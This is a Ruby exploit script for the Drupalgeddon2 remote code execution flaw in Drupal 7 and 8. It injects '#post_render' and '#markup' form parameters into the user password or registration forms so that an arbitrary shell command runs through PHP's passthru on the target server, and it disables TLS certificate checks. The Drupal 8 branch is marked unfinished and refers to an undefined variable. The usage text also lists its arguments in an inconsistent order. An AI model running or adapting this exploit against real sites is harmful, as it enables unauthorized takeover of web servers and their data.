#!/usr/bin/env ruby

# This version works both Drupal 8.X and Drupal 7.X

require 'base64'
require 'json'
require 'net/http'
require 'openssl'
require 'nokogiri'

class Target

	# host = Host URL -> http://example.com
	# PHP method to use, by default passtrhu	
	# command = Command to execute

	def initialize(host,command,php_method='passthru',form_path=0)
		@host = host
		@method = php_method
		@command = command
		@uri = URI(host)
		@form_path = form_path

		@http = create_http
	end

	def success
		puts "[+] Target seems to be exploitable! w00hooOO!"
	end

	def failed(msg)
		puts "[!] Target does NOT seem to be exploitable: " + msg
		exit
	end

	def create_http
		http = Net::HTTP.new(@uri.host, @uri.port)
		# Use SSL/TLS if needed
		if @uri.scheme == 'https'
		  http.use_ssl = true
		  http.verify_mode = OpenSSL::SSL::VERIFY_NONE
		end

		return http
	end

	def check_response(response)
		if response.code == "200"
			success		
  		else 
  			failed("Response: " + response.code)
  		end
	end

end

class Drupal8 < Target
	def initialize(host,command,php_method='passthru',form_path=0)
		super(host,command,php_method,form_path)
	end

	# Not finished yet
	def exploit

		# Make the request
		req = Net::HTTP::Post.new(URI.encode("/user/register?element_parents=account/mail/#value&ajax_form=1&_wrapper_format=drupal_ajax"))
		req.body = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + @method + "&mail[a][#type]=markup&mail[a][#markup]=" + @command

		response = http.request(req)
		check_response(response)
		puts response.body

	end
end

class Drupal7 < Target
	def initialize(host,command,php_method='passthru',form_path=0)
		super(host,command,php_method,form_path)
	end

	def get_form_build_id(response)
		page = Nokogiri::HTML(response)
		form = page.css('form#user-pass')
		return /<input type="hidden" name="form_build_id" value="([^"]+)"/.match(form.to_s)[1]
	end

	def exploit

		payload = URI.encode("name[#post_render][]=#{@method}&name[#markup]=#{@command}&name[#type]=markup")

		if @form_path == 0 then
			form = '/?q=user/password&'
			form2 = '?q=file'
		else
			form = '/user/password/?'
			form2 = 'file'
		end

		payload = form + payload
		
		puts "Requesting: " + @uri.host + payload
		puts "POST: " + 'form_id=user_pass&_triggering_element_name=name'

		#
  		# => First request, trying to obtain form_build_id
  		#
		req = Net::HTTP::Post.new(payload)
		req.body = 'form_id=user_pass&_triggering_element_name=name'

		response = @http.request(req)
		puts response.code
		
		form_build_id = get_form_build_id(response.body)
  		
	  	puts "[*] Obtained build id!: #{form_build_id}"

  		post_parameters = "form_build_id=#{form_build_id}"

  		#
  		# => Second Request
  		#
		req = Net::HTTP::Post.new(URI.encode("/#{form2}/ajax/name/#value/#{form_build_id}"))
		puts "Requesting: " + @uri.host + URI.encode("/#{form2}/ajax/name/#value/#{form_build_id}")
		puts "POST: " + post_parameters
		req.body = post_parameters

		response = @http.request(req)

		puts "Response code: " + response.code
		
		if response.body.split('[{"command"')[0] == ""
			if(@command != 'id')
				failed("Maybe incorrect input command, try simple command as 'id'")
			end
				failed("")
		end
		
		puts response.body.split('[{"command"')[0]
	end
end


# Quick how to use
if ARGV.empty? || ARGV.length < 2 || ARGV[0] == "-h" || ARGV[0] == "--help"
  puts "Usage: ruby drupalggedon2.rb <target> <version [7,8]> <command> [php_method] [form_path]"
  puts "       ruby drupalgeddon2.rb 7 https://example.com whoami passtrhu [0,1]"
  puts "form_path: 0 => Vulnerable form on /?q=user/password"
  puts "form_path: 1 => Vulnerable form on /user/password"
  exit
end

# Read in values
target = ARGV[0]
version = ARGV[1]
command = ARGV[2]
php_method = ARGV[3] || 'passthru'
form_path = ARGV[4] || 0

if version == "7"
	drupal = Drupal7.new(target,command,php_method,form_path)
else
	drupal = Drupal8.new(target,command,php_method,form_path)
end

drupal.exploit